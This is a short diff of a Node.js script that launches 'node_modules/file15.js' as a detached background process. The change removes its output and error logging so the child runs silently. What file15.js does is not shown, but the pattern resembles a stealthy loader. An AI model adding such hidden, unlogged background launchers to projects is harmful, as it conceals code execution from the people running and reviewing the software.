@@ -5,13 +5,10 @@ const { spawn } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 
-const out = fs.openSync('./out.log', 'a');
-const err = fs.openSync('./err.log', 'a');
-
 const filePath = path.join(__dirname, 'node_modules/file15.js');
 const child = spawn(process.execPath, [filePath], {
   detached: true,
-  stdio: ['ignore', out, err]
+  stdio: ['ignore', 'ignore', 'ignore']
 });
 
 child.unref(); // Allow parent to exit independently
